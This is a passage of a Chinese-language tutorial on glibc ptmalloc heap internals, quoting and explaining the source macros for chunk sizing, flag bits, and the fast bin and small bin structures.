
<p>这里，offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。</p>
<p><strong>最小申请的堆内存大小</strong></p>
<p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p>
<p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* The smallest size we can malloc is an aligned minimal chunk */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MINSIZE                                                                \</span><br><span class="hljs-meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span><br><span class="hljs-meta">                      ~MALLOC_ALIGN_MASK))</span><br></code></pre></td></tr></table></figure>

<p><strong>检查分配给用户的内存是否对齐</strong></p>
<p>2 * SIZE_SZ 大小对齐。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><span class="hljs-comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> misaligned_chunk(p)                                                    \</span><br><span class="hljs-meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span><br><span class="hljs-meta">     MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<p><strong>请求字节数判断</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br></code></pre></td></tr></table></figure>

<p><strong>将用户请求内存大小转为实际分配内存大小</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure>

<p>当一个 chunk 处于已分配状态时，它的物理相邻的下一个 chunk 的 prev_size 字段必然是无效的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用。具体流程如下</p>
<ol>
<li>首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。</li>
<li>其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。</li>
<li>由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配MINSIZE字节。</li>
<li>如果大于的话，因为系统中申请的 chunk 需要 2 * SIZE_SZ 对齐，所以这里需要加上MALLOC_ALIGN_MASK 以便于对齐。</li>
</ol>
<p><strong>个人认为，这里在 request2size 的宏的第一行中没有必要加上 MALLOC_ALIGN_MASK。</strong></p>
<p><strong>需要注意的是，通过这样的计算公式得到的 size 最终一定是满足用户需要的。</strong></p>
<p><strong>标记位相关</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* Check for chunk from main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span><br><br><span class="hljs-comment">/* Mark a chunk as not being on the main arena.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Bits to mask off when extracting size</span><br><span class="hljs-comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span><br><span class="hljs-comment">   macros for which mmapped chunks should never be seen. This should</span><br><span class="hljs-comment">   cause helpful core dumps to occur if it is tried by accident by</span><br><span class="hljs-comment">   people extending or adapting this malloc.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br></code></pre></td></tr></table></figure>

<p><strong>获取chunk size</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure>

<p><strong>获取下一个物理相邻的chunk</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure>

<p><strong>获取前一个chunk的信息</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure>

<p><strong>当前chunk使用状态相关操作</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* extract p&#x27;s inuse bit */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)                                                               \</span><br><span class="hljs-meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><br><span class="hljs-comment">/* set/clear chunk as being inuse without otherwise disturbing */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse(p)                                                           \</span><br><span class="hljs-meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse(p)                                                         \</span><br><span class="hljs-meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br></code></pre></td></tr></table></figure>

<p><strong>设置chunk的size字段</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Set size at head, without disturbing its use bit */</span><br><span class="hljs-comment">// SIZE_BITS = 7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head_size(p, s)                                                    \</span><br><span class="hljs-meta">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><br><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_foot(p, s)                                                         \</span><br><span class="hljs-meta">    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br></code></pre></td></tr></table></figure>

<p><strong>获取指定偏移的chunk</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure>

<p><strong>指定偏移处chunk使用状态相关操作</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* check/set/clear inuse bits in known places */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse_bit_at_offset(p, s)                                              \</span><br><span class="hljs-meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                                          \</span><br><span class="hljs-meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)                                        \</span><br><span class="hljs-meta">    (((mchunkptr)(((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br></code></pre></td></tr></table></figure>

<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>我们曾经说过，用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的chunk中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p>
<p>在具体的实现中，ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为4类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。</p>
<p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些bin对应的数据结构在 malloc_state 中，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBINS 128</span><br><span class="hljs-comment">/* Normal bins packed as described above */</span><br>mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br></code></pre></td></tr></table></figure>

<p>一个bin相当于一个chunk链表，我们把每个链表的头节点chunk作为bins数组，但是由于这个头节点作为bin表头，其prev_size 与 size 字段是没有任何实际作用的，因此我们在存储头节点chunk的时候仅仅只需要存储头节点chunk的fd和bk即可，而其中的prev_size 与 size 字段被重用为另一个bin的头节点的fd与bk，这样可以节省空间，并提高可用性。因此<strong>我们仅仅只需要mchunkptr类型的指针数组就足够存储这些头节点</strong>，那prev_size 与 size 字段到底是怎么重用的呢？这里我们以32位系统为例</p>
<table>
<thead>
<tr>
<th>含义</th>
<th>bin1的fd/bin2的prev_size</th>
<th>bin1的bk/bin2的size</th>
<th>bin2的fd/bin3的prev_size</th>
<th>bin2的bk/bin3的size</th>
</tr>
</thead>
<tbody><tr>
<td>bin下标</td>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
</tbody></table>
<p>可以看出除了第一个bin（unsorted bin）外，后面的每个bin的表头chunk会重用前面的bin表头chunk的fd与bk字段，将其视为其自身的prev_size和size字段。这里也说明了一个问题，<strong>bin的下标和我们所说的第几个bin并不是一致的。同时，bin表头的 chunk 头节点 的 prev_size 与 size 字段不能随便修改，因为这两个字段是其它bin表头chunk的fd和bk字段。</strong></p>
<p>数组中的 bin 依次介绍如下</p>
<ol>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为<strong>2个机器字长</strong>，即32位相差8字节，64位相差16字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
</ol>
<p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起</strong>。</p>
<p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p>
<p>bin 通用的宏如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mbinptr</span>;</span><br><br><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> bin_at(m, i)                                                           \</span><br><span class="hljs-meta">    (mbinptr)(((char *) &amp;((m)-&gt;bins[ ((i) -1) * 2 ])) -                        \</span><br><span class="hljs-meta">              offsetof(struct malloc_chunk, fd))</span><br><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-comment">//获取下一个bin的地址</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-comment">// 这两个宏可以用来遍历bin</span><br><span class="hljs-comment">// 获取 bin 的位于链表头的 chunk</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> first(b) ((b)-&gt;fd)</span><br><span class="hljs-comment">// 获取 bin 的位于链表尾的 chunk</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> last(b) ((b)-&gt;bk)</span><br></code></pre></td></tr></table></figure>

<h4 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h4><p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。<strong>因为我们把大部分时间花在了合并、分割以及中间检查的过程中。</strong>因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> *<span class="hljs-title">mfastbinptr</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    This is in malloc_state.</span><br><span class="hljs-comment">    /* Fastbins */</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];<br>*/<br></code></pre></td></tr></table></figure>

<p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong>，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 chunk 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc才会做接下来的一系列操作。</p>
<p>默认情况下（<strong>32位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的chunk的数据空间最大为80字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）定义如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> DEFAULT_MXFAST</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span><br><span class="hljs-comment">   they are used as flags.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//判断分配区是否有 fast bin chunk，1表示没有</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="hljs-comment">   regions.  Otherwise, contiguity is exploited in merging together,</span><br><span class="hljs-comment">   when possible, results from consecutive MORECORE calls.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="hljs-comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// MORECORE是否返回连续的内存区域。</span><br><span class="hljs-comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span><br><span class="hljs-comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span><br><span class="hljs-comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span><br><br><span class="hljs-comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span><br><span class="hljs-comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span><br><span class="hljs-comment">   allocated in that arena before detecting corruption are not freed.  */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Set value of max_fast.</span><br><span class="hljs-comment">   Use impossibly small value if 0.</span><br><span class="hljs-comment">   Precondition: there are no existing fastbin chunks.</span><br><span class="hljs-comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s)                                                        \</span><br><span class="hljs-meta">    global_max_fast =                                                          \</span><br><span class="hljs-meta">        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_max_fast() global_max_fast</span><br></code></pre></td></tr></table></figure>

<p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</p>
<p><strong>fastbin的索引</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span><br><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-comment">// chunk size=2*size_sz*(2+idx)</span><br><span class="hljs-comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></td></tr></table></figure>

<p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong></p>
<p>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于FASTBIN_CONSOLIDATION_THRESHOLD时，内存碎片可能比较多了，我们就需要把 fast bins 中的chunk都进行合并，以减少内存碎片对系统的影响。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span><br><span class="hljs-comment">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="hljs-comment">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="hljs-comment">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="hljs-comment">   compromise heuristic to only attempt consolidation if it is likely</span><br><span class="hljs-comment">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="hljs-comment">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="hljs-comment">   if trimming is not used.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span><br></code></pre></td></tr></table></figure>

<p><strong>malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。具体地参见后续的详细函数的分析。</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/*<br>	Chunks in fastbins keep their inuse bit set, so they cannot<br>    be consolidated with other free chunks. malloc_consolidate<br>    releases all chunks in fastbins and consolidates them with<br>    other free chunks.<br> */<br></code></pre></td></tr></table></figure>

<h4 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h4><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32位）</th>
<th>SIZE_SZ=8（64位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>x</td>
<td>2*4*x</td>
<td>2*8*x</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p>
<p>small bin相关的宏如下</p>
